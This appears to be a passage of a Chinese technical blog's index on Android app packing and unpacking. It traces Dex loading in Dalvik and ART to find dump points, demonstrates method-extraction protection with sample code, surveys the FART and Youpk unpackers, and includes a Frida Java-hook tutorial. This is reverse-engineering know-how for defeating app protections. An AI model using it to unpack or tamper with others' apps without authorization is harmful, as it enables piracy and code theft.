currentActivityThread.setAccessible(true); Object activityThreadObj = currentActivityThread.invoke(null); //final ArrayMap\u003cString, WeakReference\u003cLoadedApk\u003e\u003e mPackages = new ArrayMap\u003c\u003e(); Field mPackagesField = ActivityThreadClazz.getDeclaredField(\"mPackages\"); mPackagesField.setAccessible(true); ArrayMap mPackagesObj = (ArrayMap) mPackagesField.get(activityThreadObj); WeakReference wr = (WeakReference) mPackagesObj.get(this.getPackageName()); Object loadedApkObj = wr.get(); Class loadedApkClazz = classLoader.loadClass(\"android.app.LoadedApk\"); //private ClassLoader mClassLoader; Field mClassLoader = loadedApkClazz.getDeclaredField(\"mClassLoader\"); mClassLoader.setAccessible(true); mClassLoader.set(loadedApkObj, classLoader); } catch (NoSuchFieldException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); } } } 方案二: 用As建立另一个工程,来加载上述Dex文件,使用方案二处理Activity. package org.example.luoloaddex; import android.app.Activity; import android.content.Context; import android.content.Intent; import android.os.Bundle; import android.util.ArrayMap; import java.io.File; import java.lang.ref.WeakReference; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInsta","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:4:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"加壳技术 ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:5:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"发展 Dex加固: Dex整体加固:文件加载和内存加载. 函数抽取:在函数粒度完成代码的保护. VMP和Dex2C:Java函数Native化. So加固: 基于init、init_array以及JNI_Onload函数的加壳. 基于自定义linker的加壳. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:5:1","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"识别 是否Native化 函数体无效 函数抽取类壳 ✘ ✔ VMP壳 ✔ Native化 Dex2C壳 ✔ Native化 VMP和Dex2C的区分: VMP:核心原理是Dalvik和Art下的解释器,对Smali指令流的解析执行过程. 可参考:https://github.com/chago/ADVMP Dex2C:将Java函数转成C函数. 可参考:https://github.com/amimo/dcc 注册地址是否相同 函数逻辑是否相似 VMP壳 ✔ ✔ Dex2C壳 ✘ ✘ ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:5:2","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"各种壳解决方案 整体加固: 文件加载:定位解密文件是关键. 内存加载:加载时机和内存起始地址时关键. 方案:Dex打开和优化的流程呢以及产出的odex、dex2oat编译的流程和生成的oat文件等等. 函数抽取: 类加载和函数执行前的流程解密. 函数执行中动态自解密. 方案:关注被抽取的函数的执行流程是关键! 定位被抽取的函数的恢复时机即可. VMP和Dex2C: VMP:定位解释器是关键,找到映射关系便可恢复. Dex2C:基础是编译原理,进行了等价语义转换.彻底还原难度巨大. 方案:关注JNI相关的api调用是关键,也是分析VMP和Dex2C保护的函数的逻辑的关键. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:5:3","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"一代壳(Dex整体加固) ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:6:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"Dalvik DexClassLoader: 通过对Dalvik下DexClassLoader加载Dex源码分析,来确定脱壳点. //http://androidxref.com/4.4.4_r1/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java DexClassLoader -\u003e... -\u003e... -\u003e... //进入Native函数 -\u003eopenDexFileNative(Dalvik_dalvik_system_DexFile_openDexFileNative) -\u003edvmRawDexFileOpen(const char* fileName, const char* odexOutputName, RawDexFile** ppRawDexFile, bool isBootstrap) -\u003edvmOptimizeDexFile(int fd, off_t dexOffset, long dexLength, const char* fileName, u4 modWhen, u4 crc, bool isBootstrap) { //--- pid = fork(); if (pid == 0) { static const int kUseValgrind = 0; static const char* kDexOptBin = \"/bin/dexopt\"; //--- } } //从上述代码来看,通过调dexopt来对Dex文件进行优化 //查看dexopt源代码 //http://androidxref.com/4.4.4_r1/xref/dalvik/dexopt/OptMain.cpp main -\u003efromDex(int argc, char* const argv[]) -\u003edvmContinueOptimization(int fd, off_t dexOffset, long dexLength, const char* fileName, u4 modWhen, u4 crc, bool isBootstrap) //http://androidxref.com/4.4.4_r1/xref/dalvik/vm/analysis/DexPrepare.cpp#527 //从上述函数,开始脱壳寻找时机. -\u003erewriteDex(u1* addr, int len, bool doVerify, bool doOpt, DexClassLookup** ppClassLookup, DvmDex** ppDvmDex) -\u003edvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex) -\u003edexFileParse(const u1* data, size_t length, int flags) -\u003e... 以上过程出现加载的Dex文件起始地址和大小的地方都是脱壳点. 目前网上常用的脱壳点是dvmDexFileOpenPartial以及dexFileParse函数,从这两个函数开始脱,Dump出来的是odex文件. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:6:1","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"ART InMemoryDexClassLoader: 通过对ART下InMemoryDexClassLoader加载Dex源码分析,来确定脱壳点. //http://aospxref.com/android-8.0.0_r36/xref/libcore/dalvik/src/main/java/dalvik/system/InMemoryDexClassLoader.java InMemoryDexClassLoader -\u003eBaseDexClassLoader -\u003eDexPathList -\u003emakeInMemoryDexElements -\u003eDexFile -\u003eopenInMemoryDexFile -\u003enative Object createCookieWithDirectBuffer(ByteBuffer buf, int start, int end); native Object createCookieWithArray(byte[] buf, int start, int end); -\u003eCreateSingleDexFileCookie -\u003eCreateDexFile -\u003eDexFile::Open -\u003eDexFile::OpenCommon -\u003eDexFile::DexFile(const uint8_t* base,size_t size,const std::string\u0026 location,uint32_t location_checksum,const OatDexFile* oat_dex_file) InMemoryDexClassLoader没有生成oat文件的流程,注意以上流程中出现Dex文件起始地址和大小的地方. DexClassLoader: 通过对ART下DexClassLoader加载Dex源码分析,来确定脱壳点. //http://aospxref.com/android-8.0.0_r36/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java DexClassLoader -\u003eBaseDexClassLoader -\u003eDexPathList -\u003emakeDexElements -\u003eloadDexFile -\u003eDexFile.loadDex -\u003eprivate DexFile(String sourceName, String outputName, int flags, ClassLoader loader,DexPathList.Element[] elements) -\u003eopenDexFile -\u003eprivate static native Object openDexFileNative(String sourceName, String outputName, int flags,ClassLoader loader, DexPathList.Element[] elements); -\u003eOatFileManager::OpenDexFilesFromOat //最终会调用dex2oat -\u003eOatFileAssistant::MakeUpToDate -\u003eOatFileAssistant::GenerateOatFileNoChecks -\u003eOatFileAssistant::Dex2Oat //http://aospxref.com/android-8.0.0_r36/xref/art/runtime/oat_file_manager.cc?fi=OpenDexFilesFromOat#OpenDexFilesFromOat //从上述OatFileManager::OpenDexFilesFromOat这个函数开始分析 //如果说阻断了Dex转Oat过程,系统会尝试加载Dex OatFileManager::OpenDexFilesFromOat -\u003eDexFile::Open(const char* filename,const std::string\u0026 location,bool verify_checksum,std::string* error_msg,std::vector\u003cstd::unique_ptr\u003cconst DexFile\u003e\u003e* dex_files) -\u003eFile OpenAndReadMagic(const char* filename, uint32_t* magic, std::string* error_msg) DexFile::OpenFile(int fd,const std::string\u0026 location,bool verify,bool verify_checksum,std::string* error_msg) -\u003eDexFile::OpenCommon -\u003eDexFile::DexFile(const uint8_t* base,size_t size,const std::string\u0026 location,uint32_t location_checksum,const OatDexFile* oat_dex_file) ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:6:2","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"二代壳(函数抽取) ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:7:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"Dalvik 流程图: 上述流程为什么要Hook dexFindClass函数? 我们在Java层主动加载一个类是调用的dexClassLoader.loadClass(可以参考上面的类加载时机),来加载类的.因此可以阅读DexClassLoader类的loadClass源码来寻求答案. http://androidxref.com/4.4.4_r1/xref/libcore/libdvm/src/main/java/java/lang/ClassLoader.java ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:7:1","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"ART 手工抽取思路: 首先要干掉Dex2oat过程,如果不干掉这个过程,系统对抽取的Dex文件进行编译生成了oat文件,那么我们动态修改的Dex中的Smali指令就不会生效! 干掉Dex2oat过程可从OatFileAssistant::GenerateOatFileNoChecks这个函数开始分析,因为这个函数内容会调用OatFileAssistant::Dex2Oat这个函数. 解析Dex文件格式,找到要抽取函数的CodeItem,记下其中的指令,将其填充为0. 寻找一个Hook时机(ClassLinker::LoadMethod),在系统执行抽取的函数之前,将其原指令填充回去. 示例: 本次实现环境:Android8.1 准备一个测试Dex文件. package com.example.luodst; import android.util.Log; public class LuoTst { private final String TAG = \"[LuoHun] \"; public void fun1() { Log.d(TAG, \"org.example.luodst.fun1\"); } } 在AndroidStudio中编译上述代码,生成一个测试Dex文件. 用010Editor打开上述Dex,找到com.example.luodst.LuoTst类的fun1方法二进制指令,记下原来的并将其填充为0 struct class_def_item class_def[1484] public com.example.luodst.LuoTst B2DA4h 20h Fg: Bg:0xE0E0E0 Class ID struct method_id_item method_id[22370] void com.example.luodst.LuoTst.fun1() 96C34h 8h Fg: Bg:0x008080 Method ID 下面用GDA打开上述修改后的Dex文件,来看下现象. 重新计算上述修改后的Dex文件的checksum和sha值,回写到Dex的文件头部中. 将上述修改后的Dex文件,放到手机的/data/local/tmp目录下. 在调用抽取的的函数之前,将原始指令回填(Hook ClassLinker::LoadMethod),反射调用被抽取的函数. //Java package com.example.luoclassloader; import androidx.appcompat.app.AppCompatActivity; import android.content.Context; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luoclassloader.databinding.ActivityMainBinding; import java.io.File; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends AppCompatActivity { private final String TAG = \"[LuoHun] \"; // Used to load the 'luoclassloader' library on application startup. static { System.loadLibrary(\"luoclassloader\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); //二代壳 SecondShell(); //反射运行抽空的方法 tstDexClassLoader(getApplicationContext(), \"/data/local/tmp/2.dex\"); } public void tstDexClassLoader(Context context, String strDexFilePath) { File optFile = context.getDir(\"opt_dex\", 0); File libFile = context.getDir(\"lib_dex\", 0); DexClassLoader dexClassLoader = new DexClassLoader(strDexFilePath, optFile.getAbsolutePath(), libFile.getAbsolutePath(), context.getClassLoader()); Class clazz = null; try { clazz = dexClassLoader.loadClass(\"com.example.luodst.LuoTst\"); Object object = clazz.newInstance(); Method func1Method = clazz.getDeclaredMethod(\"fun1\"); func1Method.invoke(object); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } } public native void SecondShell(); } //Native #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003cunistd.h\u003e #include \u003candroid/log.h\u003e #include \u003cfcntl.h\u003e #include \u003casm/fcntl.h\u003e #include \u003csys/mman.h\u003e #include \u003cdlfcn.h\u003e #include \u003csys/types.h\u003e #include \u003csys/stat.h\u003e //import c header extern \"C\" { #include \"hook/dlfcn/dlfcn_compat.h\" #include \"hook/include/inlineHook.h\" } typedef unsigned char byte; #define TAG \"SecondShell\" #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__) struct DexFile { // Field order required by test \"ValidateFieldOrderOfJavaCppUnionClasses\". // The class we are a part of. uint32_t declaring_class_; // Access flags; low 16 bits are defined by spec. void *begin; /* Dex file fields. The defining dex file is available via declaring_class_-\u003edex_cache_ */ // Offset to the CodeItem. uint32_t size; }; struct ArtMethod { // Field order required by test \"ValidateFieldOrderOfJavaCppUnionClasses\". // The class we are a part of. uint32_t declaring_class_; // Access flags; low 16 bits are defined by spec. uint32_t access_flags_; /* Dex file fields. The defining dex file is available via declaring_class_-\u003edex_cache_ */ // Offset to the CodeItem. uint32_t dex_code_item_offset_;","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:7:2","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"Fart演变 ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"V1.0 Classloader中Dump 时机: App中的Application类中的attachBaseContext和onCreate函数是App中最先执行的方法. 因此需要选在Application的onCreate函数执行之后才开始被调用的任意一个函数中. 比如选择在ActivityThread中的performLaunchActivity函数作为时机,来获取最终应用的ClassLoader. 方式: 获取到应用解密后的Dex文件最终依附的ClassLoader之后,通过Java的反射机制最终获取到对应的DexFile的结构体,并完成Dex的Dump. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:1","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"V2.0 “海量\"的脱壳点 时机: 所有类和方法的装载和链接、编译和执行流程之中. 方式: ART下DexFile类中定义了两个关键的变量:begin_、size_以及用于获取这两个变量的Begin()和Size()函数. 这两个变量分别代表着当前DexFile对象对应的内存中的Dex文件加载的起始位置和大小. 只要有了这两个值,我们就可以完成对Dex的Dump. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:2","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"V3.0 优中选优 时机: 找到绕过dex2oat的时机. 类的初始化函数始终运行在ART下的inpterpreter模式. 方式: 在解释执行时进行脱壳,实现\"绕过\"dex2oat. 因此必然进入到interpreter.cc文件中的Execute函数,从而进入ART下的解释器解释执行. ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:3","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"V4.0 双保险 同时在dex2oat和类的初始化流程函数设置\"Hook” ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:4","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"Youpk https://bbs.pediy.com/thread-259854.htm 时机: App启动后10s开始 方式: 禁用dex2oat:在dex2oat中设置CompilerFilter为仅验证. //dex2oat.cc compiler_options_-\u003eSetCompilerFilter(CompilerFilter::kVerifyAtRuntime); 从ClassLinker中遍历DexFile对象并dump ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:9:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android壳世界"],"content":"参考链接 FART：ART环境下基于主动调用的自动化脱壳方案 拨云见日：安卓APP脱壳的本质以及如何快速发现ART下的脱壳点 FART正餐前甜点：ART下几个通用简单高效的dump内存中dex方法 Android免Root权限通过Hook系统函数修改程序运行时内存指令逻辑 Android中实现「类方法指令抽取方式」加固方案原理解析 干掉Dex2oat过程 ","date":"2021-12-15","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:10:0","tags":["Android"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["那些年遇过的坑"],"content":"当前记录的VMware版本为16.2.1 build-18811642 注意 如果要对VMware中运行的系统进行内存修改,在Windwos下要调试的进程是vmware-vmx.exe而不是vmware.exe ","date":"2021-12-14","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/vmware/:0:0","tags":["VMware"],"title":"VMware内存修改","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/vmware/"},{"categories":["Android Frida"],"content":"IDE配置 安装Node.js https://nodejs.org/zh-cn/ apt-get install nodejs apt-get install npm 下载frida-agent-example仓库. https://github.com/oleavr/frida-agent-example git clone https://github.com/oleavr/frida-agent-example.git 执行命令. cd frida-agent-example/ npm install 接下来使用VSCode打开此项目，在agent目录下编写代码就会有智能提示. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:1:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Frida基础 https://github.com/frida/frida ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:2:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"安装 本地Python模块安装. #下述以安装特定版本为例. #12.8.0 pip install frida==12.8.0 pip install frida-tools==5.3.0 pip install objection==1.8.4 #14.2.13 pip install frida==14.2.13 pip install frida-tools==9.2.1 pip install objection==1.11.0 frida-sever下载. https://github.com/frida/frida/releases 下载时要选择对应的版本下载. #①frida-server的版本要和计算机上的版本一致. #如frida版本为14.2.13,那么frida-server的版本也必须是14.2.13 #②frida-server的架构需要和测试机的系统以及架构一致. #如本人使用的Android测试机Nexus 5X是arm64的架构,就需要下载frida-server相应的arm64的 #可使用下述命令查询系统架构. adb shell getprop ro.product.cpu.abi 将下载的frida-server安装到手机并运行. adb push frida-server /data/local/tmp/frida-server adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server 检查frida是否安装成功. frida-ps -U 注意 Windows要将frida-ps所在的路径添加到环境变量中. 如:D:\\LuoHackTools\\Tools\\Disassemblers\\IDA_Pro_v7.5\\python38\\Scripts ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:2:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"adbWifi连接 PC和手机要连接同一个Wifi 下载安装WiFiADB.apk. #google 搜apkmirror wifi adb https://www.apkmirror.com/apk/metactrl/wifi-adb-debug-over-air/ 手机上运行上述apk,进行一些简单的设置. 拔掉数据线,执行下述命令,进行adb连接. adb connect 192.168.2.111:5555 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:2:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"非标准端口连接 手机上运行FridaServer,监听指定端口. #adb connect 192.168.2.111:5555 adb push frida-server /data/local/tmp/frida-server adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server -l 0.0.0.0:6666 PC上执行Frida命令. #frida-ps -H 192.168.2.111:6666 frida-ps -H 手机的ip:frida监听的端口 #frida -H 192.168.2.111:6666 com.example.luoanti -l .\\LuoHook.js #objection -N -h 192.168.2.111 -p 6666 -g com.android.settings explore objection -N -h 手机的ip -p frida监听的端口 -g 安卓应用 explore ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:2:3","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"基本知识 在Android逆向过程中,Frida存在两种操作模式. CLI(命令行)模式:通过命令行直接将JavaScript脚本注入进程中,对进程进行操作. frida -U LuoDst -l luoHook.js #-U 指定对USB设备操作. #-l 指定加载一个Javascript脚本. RPC模式:使用Python进行JavaScript脚本的注入工作,实际对进程进行操作的还是JavaScript脚本. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:2:4","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Frida脚本入门 Frida脚本就是利用Frida动态插桩框架,使用Frida导出的API和方法对内存空间里的对象方法进行监视、修改和替换的一段代码. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:3:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Hook基础 准备一个测试Apk. package org.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(LuoTst(1, 2)); } }); } String LuoTst(int n1, int n2){ return \"Luo\" + String.valueOf(n1 + n2); } } 本次我们Hook的目的是修改函数LuoTst的参数. 编写Js脚本进行Hook. function main() { console.log(\"Script loaded successfully \"); Java.perform(function() { console.log(\"Inside java perform function\"); //定位类 var MainActivity = Java.use(\"org.example.luodst.MainActivity\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) MainActivity.LuoTst.implementation = function (x, y) { //打印替换前的参数. console.log(\"original call: LuoTst(\" + x + \", \" + y + \")\"); //把参数替换成20和50,依旧调用原函数. var ret_value = this.LuoTst(20, 50); return ret_value; } }); } setImmediate(main) 脚本中使用function关键字定义了一个main函数,用于存放Hook脚本,然后调用Frida的API函数java.perform()将脚本中的内容注入到Java运行库.这个API的参数是一个匿名函数,函数内容是监控和修改Java函数逻辑的主体内容.注意,这里的Java.perform()函数非常重要,任何对App中Java层的操作都必须包裹在这个函数中,否则Frida运行起来后就会报错. 在Java.perform()函数包裹的匿名函数中,首先调用了Frida的API函数Java.use(),这个函数的参数是Hook的函数所在类的类名,参数的类型是一个字符串类型.这个函数的返回值动态地为相应Java类获取一个JavaScriptWrapper,可以通俗理解为一个JavaScript对象. 在获取到对应的JavaScript对象后,通过\".“符号连接LuoTst这个对应的函数名,然后加上implementation关键词表示实现MainActivity对象的LuoTst()函数,最后通过”=“这个符号连接一个匿名函数,参数内容和原Java的内容一致.不同的是,JavaScript是一个弱类型的语言,不需要指明参数类型.此时一个针对MainActivity类的LuoTst()函数的Hook框架就完成了. 在Hook一个函数时,需要注意一个地方,那就是不要修改被Hook函数的返回值类型,否则会引起程序崩溃等问题. setImmediate(Frida的API函数)函数传递的参数是要被执行的函数,比如传入main参数,表示当Frida注入App后立即执行main函数.这个函数和setTimeout()函数类似,都是用于指定要执行的函数,不同的是setTimeout可以用于指定Frida注入App多长时间后执行函数,往往用于延时注入.如果传递的第二个参数为0或者压根没有第二个参数,就和setImmediate()函数的作用一样. 手机端执行frida-server,PC端执行Js脚本. //手机端 adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server //PC端 //CLI模式 //Frida脚本是及时生效的,第一次注入使用下述命令,后续修改脚本内容,不用重新注入,只要重新保存脚本内容即可. frida -U -l luoHook.js LuoDst Hook后,点击按钮显示 Luo:70 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/:3:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida/frida-java%E5%B1%82hook/"},{"categories":["Android Frida"],"content":"Java重载函数Hook 准备一个测试Apk. package org.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(LuoTst(1, 2)); } }); } String LuoTst(int n1, int n2){ return String.valueOf(n1 + n2); } String LuoTst(String str){ return str.toLowerCase(); } } 可以看到LuoTst()方法有了重载,在参数是两个int类型的情况下,返回两个整数之和;当参数类型为String类型时,返回字符串的小写形式. 本次我们Hook的目的是修改重载函数LuoTst(int, int)的参数. 编写Js脚本进行Hook. function main() { console.log(\"Script loaded successfully \"); Java.perform(function() { console.log(\"Inside java perform function\"); 